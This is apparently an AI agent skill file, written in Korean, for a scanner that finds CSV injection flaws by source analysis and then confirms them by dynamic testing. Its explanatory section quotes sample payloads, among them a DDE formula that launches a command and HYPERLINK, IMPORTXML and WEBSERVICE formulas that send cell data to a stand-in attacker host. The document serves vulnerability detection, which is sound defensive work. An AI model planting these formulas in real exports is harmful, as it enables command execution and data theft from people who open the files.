
# CSV Injection Scanner

소스코드 분석으로 CSV Injection 취약점 후보를 식별한 뒤, 동적 테스트로 실제로 수식이 포함된 CSV가 생성되는지 검증하여 확인된 취약점만 보고하는 스킬이다.

## 핵심 원칙: "수식이 CSV에 포함되지 않으면 취약점이 아니다"

사용자 입력이 CSV로 내보내지는 기능이 있다고 바로 취약점으로 보고하지 않는다. 실제로 `=`, `+`, `-`, `@`, `\t`, `\r` 같은 수식 시작 문자가 이스케이프 없이 CSV 셀에 포함되어, 스프레드시트 프로그램(Excel, Google Sheets 등)에서 열었을 때 수식이 실행되는 것을 확인해야 취약점이다.

## CSV Injection의 원리

스프레드시트 프로그램은 CSV 셀 값이 `=`, `+`, `-`, `@`로 시작하면 수식으로 해석한다. 공격자가 이 문자로 시작하는 값을 입력하면, 해당 값이 CSV로 내보내진 뒤 다른 사용자가 스프레드시트에서 열었을 때 수식이 실행된다.

```
# 공격자가 입력한 이름
=CMD|'/C calc.exe'!A1

# CSV로 내보내면
name,email
=CMD|'/C calc.exe'!A1,attacker@evil.com

# Excel에서 열면 → 명령어 실행 시도 (DDE)
```

## 취약점의 유형

### DDE (Dynamic Data Exchange) 실행
`=CMD|'/C malicious_command'!A1` 같은 DDE 페이로드로 시스템 명령어를 실행. Excel에서 "외부 데이터 연결 허용" 시 실행됨. 최신 Excel에서는 기본 차단되지만 경고 무시 시 실행 가능.

### 데이터 탈취 (HYPERLINK + 외부 URL)
`=HYPERLINK("https://attacker.com/steal?data="&A1, "Click here")` 로 다른 셀의 데이터를 외부 서버로 전송.

### 외부 리소스 로딩
`=IMPORTXML("https://attacker.com/", "//data")` (Google Sheets), `=WEBSERVICE("https://attacker.com/")` (Excel) 등으로 외부 요청을 유발.

### 매크로/스크립트 유도
CSV 내용으로 사용자를 속여 매크로를 활성화하도록 유도하는 소셜 엔지니어링 벡터.

## 분석 프로세스

이 스캐너의 분석은 두 단계로 구성된다:

1. **Phase 1 (소스코드 분석)**: `phase1.md` 참조
2. **Phase 2 (동적 테스트)**: `phase2.md` 참조

